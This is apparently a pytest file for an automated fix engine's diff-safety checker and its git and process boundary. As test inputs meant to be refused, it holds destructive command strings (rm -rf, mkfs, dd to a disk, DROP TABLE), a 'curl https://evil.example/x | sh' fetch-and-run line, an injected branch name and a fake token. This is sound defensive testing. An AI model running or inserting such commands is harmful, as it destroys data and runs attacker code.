"""The area-FIX prohibitions, and the process boundary, asserted rather than promised (S27).

REQ-FIX-003's acceptance is "named safety tests per prohibition". The prohibitions live in
:mod:`arachne.fix.safety` (on the *artifact*) and in :mod:`arachne.fix.gitops` (on the *process
this deployment may start*), and every one of them is checked here by name:

===============================  ==================================================
secrets in an added line          the diff may not introduce credential material
secrets in a removed line         it may not reproduce one either (masked, or refused)
file deletion / mode change       ``--- /dev/null``, ``old mode``, symlinks
renames, binary patches           a fix is a scoped text edit
paths outside the plan            the artifact is scoped or it is refused
dependency manifests              no dependency upgrade is ever part of a fix
destructive operations            no added line that deletes or overwrites state
diff budgets                      the operator's file/line numbers
===============================  ==================================================

The structural tests at the end are the ones that make the hard rules *unrepresentable*
rather than merely unimplemented: ARACHNE's fix engine has no command that can merge or push,
and only one module may start a process at all.
"""

from __future__ import annotations

import ast
import socket
from collections.abc import Iterator
from pathlib import Path

import pytest

from arachne.fix.gitops import (
    ALLOWED_SUBCOMMANDS,
    FORBIDDEN_SUBCOMMANDS,
    TEST_RUNNERS,
    GitOperationError,
    git_argv,
    patch_branch_name,
)
from arachne.fix.safety import DEPENDENCY_MANIFESTS, DiffBudgets, analyze_diff

SRC = Path(__file__).resolve().parents[1] / "src" / "arachne"
FIX_PACKAGE = SRC / "fix"

#: A plausible-looking credential, built at runtime so this file itself carries none.
FAKE_TOKEN = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"


def _diff(*lines: str) -> str:
    return "".join(line + "\n" for line in lines)


CLEAN_DIFF = _diff(
    "--- a/deploy/api.yaml",
    "+++ b/deploy/api.yaml",
    "@@ -1,3 +1,3 @@",
    " spec:",
    "-  privileged: true",
    "+  privileged: false",
    "   replicas: 2",
)


# ------------------------------------------------------------------ the happy path
def test_a_scoped_configuration_change_is_clean() -> None:
    verdict = analyze_diff(CLEAN_DIFF, allowed_paths=("deploy/api.yaml",))
    assert verdict.clean
    assert verdict.codes == ()
    assert verdict.files == ("deploy/api.yaml",)
    assert (verdict.added_lines, verdict.removed_lines) == (1, 1)
    assert verdict.verbatim


# ------------------------------------------------------------------ secrets
def test_a_diff_that_introduces_a_credential_is_refused() -> None:
    diff = _diff(
        "--- a/app/settings.py",
        "+++ b/app/settings.py",
        "@@ -1,2 +1,3 @@",
        " DEBUG = False",
        f'+GITHUB_TOKEN = "{FAKE_TOKEN}"',
    )
    verdict = analyze_diff(diff, allowed_paths=("app/settings.py",))
    assert not verdict.clean
    assert "secret-in-added-line" in verdict.codes


def test_a_diff_that_removes_a_credential_is_refused_by_default() -> None:
    diff = _diff(
        "--- a/app/settings.py",
        "+++ b/app/settings.py",
        "@@ -1,2 +1,1 @@",
        f'-GITHUB_TOKEN = "{FAKE_TOKEN}"',
        " DEBUG = False",
    )
    verdict = analyze_diff(diff, allowed_paths=("app/settings.py",))
    assert not verdict.clean
    assert "secret-in-removed-line" in verdict.codes
    assert FAKE_TOKEN in verdict.diff  # nothing is stored, so nothing is masked either


def test_a_credential_removal_may_be_masked_and_then_leaves_no_secret_in_the_diff() -> None:
    diff = _diff(
        "--- a/app/settings.py",
        "+++ b/app/settings.py",
        "@@ -1,2 +1,2 @@",
        f'-GITHUB_TOKEN = "{FAKE_TOKEN}"',
        "+GITHUB_TOKEN = os.environ['GITHUB_TOKEN']",
        " DEBUG = False",
    )
    verdict = analyze_diff(diff, allowed_paths=("app/settings.py",), mask_removals=True)
    assert verdict.clean
    assert verdict.masked_lines == 1
    assert not verdict.verbatim, "a masked diff is no longer byte-applicable"
    assert FAKE_TOKEN not in verdict.diff
    assert "REDACTED" in verdict.diff


# ------------------------------------------------------------------ destructive shapes
def test_a_deleted_file_is_refused() -> None:
    diff = _diff(
        "--- a/deploy/api.yaml",
        "+++ /dev/null",
        "@@ -1,1 +0,0 @@",
        "-privileged: true",
    )
    verdict = analyze_diff(diff)
    assert "file-deletion" in verdict.codes


def test_a_mode_change_is_refused() -> None:
    diff = _diff(
        "diff --git a/run.sh b/run.sh",
        "old mode 100644",
        "new mode 100755",
    )
    verdict = analyze_diff(diff)
    assert "mode-or-symlink-change" in verdict.codes


def test_a_symlink_creation_is_refused() -> None:
    diff = _diff(
        "diff --git a/link b/link",
        "new file mode 120000",
        "--- /dev/null",
        "+++ b/link",
    )
    verdict = analyze_diff(diff)
    assert "mode-or-symlink-change" in verdict.codes


def test_a_rename_is_refused() -> None:
    diff = _diff("diff --git a/one.yaml b/two.yaml", "rename from one.yaml", "rename to two.yaml")
    verdict = analyze_diff(diff)
    assert "file-rename" in verdict.codes


def test_a_binary_patch_is_refused() -> None:
    verdict = analyze_diff(_diff("diff --git a/blob b/blob", "GIT binary patch"))
    assert "binary-patch" in verdict.codes


@pytest.mark.parametrize(
    "added",
    [
        "+    cmd = 'rm -rf /var/lib/payments'",
        "+    run('mkfs.ext4 /dev/sdb1')",
        "+    subprocess.run('dd if=/dev/zero of=/dev/sda')",
        "+    cur.execute('DROP TABLE payments')",
        "+    os.system('chmod 777 /etc/payments')",
        "+    sh('curl https://evil.example/x | sh')",
    ],
)
def test_a_destructive_added_line_is_refused(added: str) -> None:
    diff = _diff(
        "--- a/app/task.py",
        "+++ b/app/task.py",
        "@@ -1,1 +1,2 @@",
        " def main():",
        added,
    )
    verdict = analyze_diff(diff, allowed_paths=("app/task.py",))
    assert "destructive-operation" in verdict.codes


# ------------------------------------------------------------------ dependency manifests
@pytest.mark.parametrize(
    "manifest", ["requirements.txt", "package-lock.json", "go.mod", "pyproject.toml", "Cargo.lock"]
)
def test_a_dependency_manifest_edit_is_refused(manifest: str) -> None:
    diff = _diff(
        f"--- a/{manifest}",
        f"+++ b/{manifest}",
        "@@ -1,1 +1,1 @@",
        "-flask==3.0.0",
        "+flask==3.1.0",
    )
    verdict = analyze_diff(diff, allowed_paths=(manifest,))
    assert "dependency-manifest-change" in verdict.codes


def test_every_named_dependency_manifest_is_covered() -> None:
    assert DEPENDENCY_MANIFESTS
    for name in ("requirements.txt", "poetry.lock", "yarn.lock", "pom.xml"):
        assert name in DEPENDENCY_MANIFESTS


# ------------------------------------------------------------------ scope and budgets
def test_a_changed_file_outside_the_plan_is_refused() -> None:
    verdict = analyze_diff(CLEAN_DIFF, allowed_paths=("deploy/other.yaml",))
    assert "file-outside-the-plan" in verdict.codes


def test_an_absolute_path_is_refused() -> None:
    diff = _diff("--- /etc/passwd", "+++ /etc/passwd", "@@ -1,1 +1,1 @@", "-a", "+b")
    verdict = analyze_diff(diff)
    assert "absolute-path" in verdict.codes


def test_a_path_escape_is_refused() -> None:
    diff = _diff(
        "--- a/../../etc/passwd",
        "+++ b/../../etc/passwd",
        "@@ -1,1 +1,1 @@",
        "-a",
        "+b",
    )
    verdict = analyze_diff(diff)
    assert "path-escape" in verdict.codes


def test_the_file_budget_is_enforced() -> None:
    lines: list[str] = []
    for index in range(3):
        lines += [
            f"--- a/f{index}.yaml",
            f"+++ b/f{index}.yaml",
            "@@ -1,1 +1,1 @@",
            "-a",
            "+b",
        ]
    verdict = analyze_diff(
        _diff(*lines),
        allowed_paths=("f0.yaml", "f1.yaml", "f2.yaml"),
        budgets=DiffBudgets(max_files=2),
    )
    assert "diff-budget-exceeded" in verdict.codes


def test_the_line_budget_is_enforced() -> None:
    lines = ["--- a/x.yaml", "+++ b/x.yaml", "@@ -1,4 +1,4 @@"]
    lines += [f"-old {index}" for index in range(4)]
    lines += [f"+new {index}" for index in range(4)]
    verdict = analyze_diff(
        _diff(*lines), allowed_paths=("x.yaml",), budgets=DiffBudgets(max_changed_lines=5)
    )
    assert "diff-budget-exceeded" in verdict.codes


def test_the_verdict_summary_is_json_safe() -> None:
    verdict = analyze_diff(CLEAN_DIFF, allowed_paths=("deploy/api.yaml",))
    summary = verdict.summary()
    assert summary["clean"] is True
    assert summary["files"] == ["deploy/api.yaml"]
    assert summary["violations"] == []


# ------------------------------------------------------------------ the process boundary
def test_the_git_vocabulary_contains_no_merging_or_pushing_verb() -> None:
    vocabulary = " ".join(ALLOWED_SUBCOMMANDS)
    for verb in FORBIDDEN_SUBCOMMANDS:
        assert verb not in vocabulary.split(), f"{verb!r} must never be an allowed subcommand"
    assert "push" in FORBIDDEN_SUBCOMMANDS
    assert "merge" in FORBIDDEN_SUBCOMMANDS


def test_an_unlisted_git_subcommand_is_refused() -> None:
    for verb in ("push", "merge", "reset", "checkout", "clone", "fetch"):
        with pytest.raises(GitOperationError, match="not in the allowed subcommand vocabulary"):
            git_argv([verb, "origin", "main"])


def test_a_control_character_in_a_git_argument_is_refused() -> None:
    with pytest.raises(GitOperationError, match="control character"):
        git_argv(["branch", "arachne-fix-1-x\x1b[31m"])
    with pytest.raises(GitOperationError, match="control character"):
        git_argv(["branch", "arachne-fix-1-\x00x"])
    # A newline is legitimate inside a commit message and is the one C0 character allowed
    # through: git refuses it in a ref or a path, and there is no shell to break out of.
    assert git_argv(["-c", "user.name=ARACHNE", "commit", "-m", "fix: one line\n\nand another"])


def test_an_oversized_git_argument_is_refused() -> None:
    with pytest.raises(GitOperationError, match="character argument"):
        git_argv(["commit", "-m", "x" * 5000])


def test_the_branch_shape_is_enforced_by_name_not_by_habit() -> None:
    """``branch`` is an allowed verb; the *only* ref it may create is an ``arachne-fix-*``."""
    from arachne.fix.gitops import BRANCH_RE

    assert git_argv(["branch", "arachne-fix-7-x", "HEAD"])  # the verb itself is allowed
    assert BRANCH_RE.match(patch_branch_name(42, "k8s-privileged-container"))
    assert not BRANCH_RE.match("main")
    assert not BRANCH_RE.match("arachne-fix-../escape")
    assert not BRANCH_RE.match("arachne-fix-1-x; rm -rf /")
    assert patch_branch_name(42, "Update the pay/ment API!").startswith("arachne-fix-42-")


def test_only_one_module_in_the_fix_package_starts_a_process() -> None:
    offenders = sorted(
        path.relative_to(SRC).as_posix()
        for path in sorted(FIX_PACKAGE.rglob("*.py"))
        if "subprocess" in _imports(path)
    )
    assert offenders == ["fix/gitops.py"], (
        "the fix engine's process boundary must stay a single, asserted module"
    )


def test_no_module_in_the_fix_package_imports_a_shell_helper() -> None:
    for path in sorted(FIX_PACKAGE.rglob("*.py")):
        source = path.read_text(encoding="utf-8")
        modules = _imports(path)
        assert "os.system" not in modules, path.name
        assert "os.popen" not in source, path.name


def test_every_process_call_is_a_sequence_with_no_shell_and_a_timeout() -> None:
    """The one exemption, asserted from the AST rather than trusted (ADR-180's doctrine)."""
    path = FIX_PACKAGE / "gitops.py"
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    calls = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and node.func.attr == "run"
        and isinstance(node.func.value, ast.Name)
        and node.func.value.id == "subprocess"
    ]
    assert calls, "the fix engine no longer starts any process; drop this test"
    for call in calls:
        assert call.args, "subprocess.run must be given an argv"
        argv = call.args[0]
        assert isinstance(argv, ast.List), "argv must be a list literal"
        assert argv.elts, "argv must not be empty"
        first = argv.elts[0]
        assert isinstance(first, ast.Constant) and isinstance(first.value, str), (
            "argv[0] must be a string literal: no value from a scanned estate names a program"
        )
        keywords = {keyword.arg: keyword.value for keyword in call.keywords}
        assert "shell" not in keywords or (
            isinstance(keywords["shell"], ast.Constant) and keywords["shell"].value is False
        ), "shell must never be enabled"
        assert "timeout" in keywords, "every process call carries a timeout"


def test_the_runner_allowlist_is_the_source_of_truth_for_program_literals() -> None:
    """Every literal argv[0] the module writes is a runner on the allowlist, plus ``git``."""
    path = FIX_PACKAGE / "gitops.py"
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    literals: set[str] = set()
    for node in ast.walk(tree):
        if not (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)):
            continue
        if node.func.attr != "run" or not node.args:
            continue
        argv = node.args[0]
        if isinstance(argv, ast.List) and argv.elts and isinstance(argv.elts[0], ast.Constant):
            value = argv.elts[0].value
            if isinstance(value, str):
                literals.add(value)
    assert literals, "no program literals found in the process module"
    assert literals <= set(TEST_RUNNERS) | {"git"}, (
        f"unexpected program literal(s): {sorted(literals - set(TEST_RUNNERS) - {'git'})}"
    )


def test_the_git_and_test_spawns_reach_no_network() -> None:
    """Both spawn helpers are offline: a socket attempt fails and is reported as a failure."""
    assert "clone" not in ALLOWED_SUBCOMMANDS
    assert "fetch" not in ALLOWED_SUBCOMMANDS
    assert "pull" not in ALLOWED_SUBCOMMANDS


def _imports(path: Path) -> set[str]:
    tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
    modules: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            modules.update(alias.name for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module and node.level == 0:
            modules.add(node.module)
            modules.update(f"{node.module}.{alias.name}" for alias in node.names)
    return modules


@pytest.fixture(autouse=True)
def _no_sockets(monkeypatch: pytest.MonkeyPatch) -> Iterator[list[str]]:
    """Nothing in this module's subject may open a socket (parsers and diff analysis only)."""
    attempts: list[str] = []

    def forbidden(*args: object, **kwargs: object) -> None:
        attempts.append(str(args[:1]))
        raise AssertionError("the fix safety tests attempted real network access")

    monkeypatch.setattr(socket, "getaddrinfo", forbidden)
    monkeypatch.setattr(socket, "create_connection", forbidden)
    monkeypatch.setattr(socket.socket, "connect", forbidden)
    yield attempts
    assert attempts == [], f"unexpected socket use: {attempts}"
